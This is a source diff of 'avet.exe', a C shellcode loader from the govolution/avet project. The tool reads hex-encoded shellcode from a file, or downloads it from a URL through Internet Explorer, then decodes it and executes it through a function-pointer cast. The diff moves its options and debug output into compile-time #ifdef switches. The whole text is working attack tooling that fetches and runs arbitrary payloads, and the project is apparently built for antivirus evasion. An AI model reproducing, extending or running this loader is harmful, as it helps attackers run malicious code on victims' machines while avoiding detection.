@@ -10,7 +10,7 @@ Web: https://github.com/govolution/avet
    printf("avet.exe: Tool for executing, encoding and decoding shellcode in a text file\n\n");
    printf("The shellcode file is derived from a shellcode in c format, for example from msfpayload and converted with a simple sh-script, like this:\n\n");
    printf("Options:\n");
-   printf("-f exec shellcode from file, needs filename\n");
+//   printf("-f exec shellcode from file, needs filename\n");
    printf("-u load and exec shellcode from url using internet explorer\n");
    printf("-p print debug information\n");
    printf("Example usage:\n");
@@ -53,13 +53,12 @@ int get_filesize(char *fvalue);
 unsigned char* load_textfile(char *fvalue, unsigned char *buf, int size2);
 unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size);
 void exec_shellcode(unsigned char *shellcode);
+#ifdef UVALUE
 char* ie_download(char* string, char* sh_filename);
-
-int print_debug;
+#endif
 
 int main (int argc, char **argv)
 {
-	print_debug = 0;
 	char *fvalue = NULL;
 	char *uvalue = NULL;
 
@@ -68,19 +67,26 @@ int main (int argc, char **argv)
 
 	opterr = 0;
 
+#ifdef LVALUE
+fvalue=argv[1];
+#endif
+
 	// compute the options
-	while ((c = getopt (argc, argv, "f:u:p")) != -1)
+	while ((c = getopt (argc, argv, "u:p")) != -1)
 		switch (c)
 		{
+			/*
 			case 'f':
 				fvalue = optarg;
 				break;
 			case 'u':
 				uvalue = optarg;
 				break;
+			
 			case 'p':
 				print_debug = 1;
 				break;
+*/
 			case '?':
 				if (optopt == 'f')
 					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
@@ -95,14 +101,12 @@ int main (int argc, char **argv)
 				abort ();
 		}
 
-	if (print_debug)
-	{
+#ifdef PRINT_DEBUG
 		printf ("fvalue = %s ", fvalue);
 		printf ("uvalue = %s ", uvalue);
-		printf ("print_debug = %d", print_debug);
 		for (index = optind; index < argc; index++)
 			printf ("Non-option argument %s\n", argv[index]);
-	}
+#endif
 
 // compute #defines from defs.h
 #ifdef FVALUE
@@ -123,9 +127,11 @@ int main (int argc, char **argv)
 		unsigned char *buffer;
 		unsigned char *shellcode;
 		int size;
-#ifndef FVALUE
-		if (print_debug)
+//#ifndef FVALUE
+#ifdef LVALUE
+		#ifdef PRINT_DEBUG
 			printf("exec shellcode from file\n");
+		#endif
 
 		size = get_filesize(fvalue);
 		buffer = load_textfile(fvalue, buffer, size);
@@ -145,16 +151,20 @@ int main (int argc, char **argv)
 		exec_shellcode(shellcode);
 	}
 	// exec from url
+#ifdef UVALUE
 	else if (uvalue)
 	{
-		if (print_debug)
+		#ifdef PRINT_DEBUG
 			printf("exec shellcode from url\n");
+		#endif
 
 		char *sh_filename;
 		sh_filename = ie_download(uvalue, sh_filename);
 		int x=strlen(sh_filename);
-		if (print_debug)
+		
+		#ifdef PRINT_DEBUG	
 			printf("\n\n%d\n\n", x);
+		#endif 
 
 		unsigned char *buffer;
 		unsigned char *shellcode;
@@ -164,6 +174,7 @@ int main (int argc, char **argv)
 		shellcode = decode_shellcode(buffer,shellcode,size);
 		exec_shellcode(shellcode);
 	}
+#endif
 
 	return 0;
 }
@@ -180,9 +191,10 @@ int get_filesize(char *fvalue)
 	}
 	for (size = 0; (rc1 = getc(fp1)) != EOF; size++) {}
 	fclose(fp1);
-
-	if (print_debug)
+	
+	#ifdef PRINT_DEBUG
 		printf("get_filesize, filesize %s: %d\n", fvalue, size);
+	#endif
 
 	return size;
 }
@@ -190,8 +202,9 @@ int get_filesize(char *fvalue)
 // return pointer to text buffer
 unsigned char* load_textfile(char *fvalue, unsigned char *buffer, int size)
 {
-	if (print_debug)
+	#ifdef PRINT_DEBUG
 		printf("load_textfile called: fvalue: %s, size: %d\n", fvalue, size);
+	#endif
 
 	//allocate buffer, open file, read file to the buffer, close the file
 	buffer=(unsigned char*)malloc(size+1);
@@ -213,8 +226,9 @@ unsigned char* load_textfile(char *fvalue, unsigned char *buffer, int size)
 		buffer[i] = rc;
 	}
 
-	if (print_debug)
+	#ifdef PRINT_DEBUG
 		printf("%s\n",buffer);
+	#endif
 
 	fclose(fp);
 	return buffer;
@@ -226,8 +240,9 @@ unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode,
 	int j=0;
 	shellcode=malloc((size/2));
 
-	if (print_debug)
+	#ifdef PRINT_DEBUG
 		printf("decode_shellcode, size for malloc: %d\nShellcode output:\n",size/2);
+	#endif
 
 	int i=0;
 	do
@@ -236,29 +251,33 @@ unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode,
 		sprintf((char*)temp,"%c%c",buffer[i],buffer[i+1]);
 		shellcode[j] = strtoul(temp, NULL, 16);
 
-		if (print_debug)
+		#ifdef PRINT_DEBUG
 			printf("%x",shellcode[j]);
+		#endif
 
 		i+=2;
 		j++;
 	} while(i<size);
 
-	if (print_debug)
+	#ifdef PRINT_DEBUG
 		printf("\n ");
+	#endif
 
 	return shellcode;
 }
 
 void exec_shellcode(unsigned char *shellcode)
 {
-	if (print_debug)
+	#ifdef PRINT_DEBUG
 		printf("exec_shellcode\n ");
+	#endif
 
 	int (*funct)();
 	funct = (int (*)()) shellcode;
 	(int)(*funct)();
 }
 
+#ifdef UVALUE
 // return pointer to the filename
 char* ie_download(char* string, char* sh_filename)
 {
@@ -281,8 +300,9 @@ char* ie_download(char* string, char* sh_filename)
 		ptr = strtok(NULL, delimiter);
 	}
 
-	if (print_debug)
+	#ifdef PRINT_DEBUG
 		printf("ie_download, filename: %s\n", fname);
+	#endif
 
 	// split the filename
 	char delimiter2[] = ".";
@@ -291,8 +311,9 @@ char* ie_download(char* string, char* sh_filename)
 	sname = ptr;
 	ptr = strtok(NULL, delimiter2);
 
-	if (print_debug)
+	#ifdef PRINT_DEBUG
 		printf("ie_download, name to search for: %s\n", sname);
+	#endif
 
 	// search for the file in user profile
 
@@ -312,9 +333,10 @@ char* ie_download(char* string, char* sh_filename)
 	strcat (searchstring,"\" > \"");
 	strcat (searchstring,tmp_home);
 	strcat (searchstring,"\\shellcodefile.txt\"");
-
-	if (print_debug)
+	
+	#ifdef PRINT_DEBUG
 		printf ("ie_download, searchstring: %s\n", searchstring);
+	#endif
 
 	// build & execute cmd
 	char cmd[500];
@@ -339,9 +361,11 @@ char* ie_download(char* string, char* sh_filename)
 	sh_filename = load_textfile (dirfile, sh_filename, size_sh_filename);
 	// there is always emtpy space at the end of the file -> delete that
 	sh_filename[size_sh_filename-2]=0x0;
-
-	if (print_debug)
+	
+	#ifdef PRINT_DEBUG
 		printf ("ie_download, sh_filename: >>>%s<<<, size: %d\ntest\n", sh_filename, size_sh_filename);
+	#endif
 
 	return sh_filename;
 }
+#endif
